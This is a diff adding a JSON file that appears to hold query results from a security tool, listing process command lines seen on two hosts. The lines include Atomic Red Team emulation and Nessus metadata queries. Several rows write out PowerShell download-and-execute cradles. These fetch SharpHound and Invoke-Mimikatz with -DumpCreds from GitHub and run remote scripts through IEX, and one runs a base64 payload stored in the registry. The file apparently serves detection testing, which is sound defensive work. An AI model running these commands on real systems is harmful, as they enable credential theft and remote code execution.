@@ -1,0 +1,137 @@
+{
+  "documents_found": 13,
+  "values_loaded": 45,
+  "took": 25,
+  "is_partial": false,
+  "columns": [
+    {
+      "name": "executions",
+      "type": "long"
+    },
+    {
+      "name": "first_seen",
+      "type": "date"
+    },
+    {
+      "name": "last_seen",
+      "type": "date"
+    },
+    {
+      "name": "host.name",
+      "type": "keyword"
+    },
+    {
+      "name": "process.name",
+      "type": "keyword"
+    },
+    {
+      "name": "process.command_line",
+      "type": "keyword"
+    },
+    {
+      "name": "duration_minutes",
+      "type": "integer"
+    }
+  ],
+  "values": [
+    [
+      2,
+      "2026-03-14T19:26:45.000Z",
+      "2026-03-14T19:26:45.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"powershell.exe\" & {write-host \\\"\"Remote download of SharpHound.ps1 into memory, followed by execution of the script\\\"\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5}",
+      0
+    ],
+    [
+      2,
+      "2026-03-14T19:26:45.000Z",
+      "2026-03-14T19:26:45.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:49.485Z",
+      "2026-03-12T11:47:49.485Z",
+      "SSI-F9",
+      "powershell.exe",
+      "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe  \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"x-ms-version\\\", \\\"2015-04-05\\\"); $webClient.Headers.add(\\\"x-ms-guest-agent-name\\\", \\\"WaAgent-2.5.0.0 (2.7.0.0)\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/machine?comp=goalstate\\\")};\" ",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:51.746Z",
+      "2026-03-12T11:47:51.746Z",
+      "SSI-F9",
+      "powershell.exe",
+      "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe  \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"Metadata\\\", \\\"true\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\\\")};\" ",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:51.746Z",
+      "2026-03-12T11:47:51.746Z",
+      "SSI-F9",
+      "cmd.exe",
+      "C:\\Windows\\System32\\cmd.exe /c \"echo nessus_cmd_L21ldGFkYXRhL2luc3RhbmNlL2NvbXB1dGU/YXBpLXZlcnNpb249MjAxNy0xMi0wMQ==_start & C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"Metadata\\\", \\\"true\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\\\")};\" & echo nessus_cmd_L21ldGFkYXRhL2luc3RhbmNlL2NvbXB1dGU/YXBpLXZlcnNpb249MjAxNy0xMi0wMQ==_stop\"",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:48.947Z",
+      "2026-03-12T11:47:48.947Z",
+      "SSI-F9",
+      "cmd.exe",
+      "C:\\Windows\\System32\\cmd.exe /c \"echo nessus_cmd_L21hY2hpbmU/Y29tcD1nb2Fsc3RhdGU=_start & C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe \"& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\\\"x-ms-version\\\", \\\"2015-04-05\\\"); $webClient.Headers.add(\\\"x-ms-guest-agent-name\\\", \\\"WaAgent-2.5.0.0 (2.7.0.0)\\\"); $webClient.DownloadString(\\\"http://168.63.129.16/machine?comp=goalstate\\\")};\" & echo nessus_cmd_L21hY2hpbmU/Y29tcD1nb2Fsc3RhdGU=_stop\"",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:51.207Z",
+      "2026-03-12T11:47:51.207Z",
+      "SSI-F9",
+      "powershell.exe",
+      "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe  \"& {$webClient = New-Object System.Net.WebClient; $webClient.DownloadString(\\\"http://168.63.129.16/metadata/latest/InstanceInfo\\\")};\" ",
+      0
+    ],
+    [
+      1,
+      "2026-03-14T19:26:47.000Z",
+      "2026-03-14T19:26:47.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"cmd.exe\" /c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\"",
+      0
+    ],
+    [
+      1,
+      "2026-03-14T19:26:46.000Z",
+      "2026-03-14T19:26:46.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"cmd.exe\" /c powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"",
+      0
+    ],
+    [
+      1,
+      "2026-03-14T19:26:47.000Z",
+      "2026-03-14T19:26:47.000Z",
+      "LB-CCDEMO-01-RD",
+      null,
+      "\"powershell.exe\" & {# Encoded payload in next command is the following \\\"\"Set-Content -path \\\"\"$env:SystemRoot/Temp/art-marker.txt\\\"\" -value \\\"\"Hello from the Atomic Red Team\\\"\"\\\"\"\nreg.exe add \\\"\"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\\\"\" /v ART /t REG_SZ /d \\\"\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\"\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))}",
+      0
+    ],
+    [
+      1,
+      "2026-03-12T11:47:51.207Z",
+      "2026-03-12T11:47:51.207Z",
+      "SSI-F9",
+      "cmd.exe",
+      "C:\\Windows\\System32\\cmd.exe /c \"echo nessus_cmd_L21ldGFkYXRhL2xhdGVzdC9JbnN0YW5jZUluZm8=_start & C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe \"& {$webClient = New-Object System.Net.WebClient; $webClient.DownloadString(\\\"http://168.63.129.16/metadata/latest/InstanceInfo\\\")};\" & echo nessus_cmd_L21ldGFkYXRhL2xhdGVzdC9JbnN0YW5jZUluZm8=_stop\"",
+      0
+    ]
+  ]
+}
